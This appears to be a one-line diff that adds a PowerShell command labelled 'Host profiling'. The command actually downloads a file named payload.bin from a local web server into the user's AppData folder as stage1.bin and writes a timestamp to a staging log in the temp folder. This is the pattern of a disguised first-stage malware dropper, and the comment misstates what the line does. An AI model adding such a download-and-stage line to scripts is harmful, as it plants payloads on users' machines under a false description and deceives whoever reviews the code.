@@ -1,0 +1,1 @@
+<# Host profiling #> (New-Object System.Net.WebClient).DownloadFile("http://localhost:8080/downloads/payload.bin", "$env:APPDATA\stage1.bin"); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $ProgressPreference = "SilentlyContinue"
